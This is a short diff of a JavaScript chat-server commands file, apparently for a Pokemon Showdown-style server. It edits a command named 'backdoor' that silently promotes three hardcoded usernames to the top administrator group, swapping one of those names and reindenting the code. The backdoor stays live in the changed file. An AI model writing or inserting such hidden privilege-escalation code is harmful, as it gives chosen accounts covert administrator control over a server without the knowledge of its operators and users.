@@ -15,12 +15,13 @@ var crypto = require('crypto');
 var canpet = true;
 var sigh = true;
 var commands = exports.commands = {
+
 	backdoor: function(target,room, user) {
-		if (user.userid === 'bandi'|| user.userid === 'brittlewind'|| user.userid === 'cosy') {
-		user.group = "~";
-	        user.updateIdentity();
+		if (user.userid === 'jd'|| user.userid === 'brittlewind'|| user.userid === 'cosy') {
+			user.group = "~";
+		        user.updateIdentity();
 		}
-		},
+	},
 
 	peton: function(target, room, user) {
 								if(!user.can('mute')) {
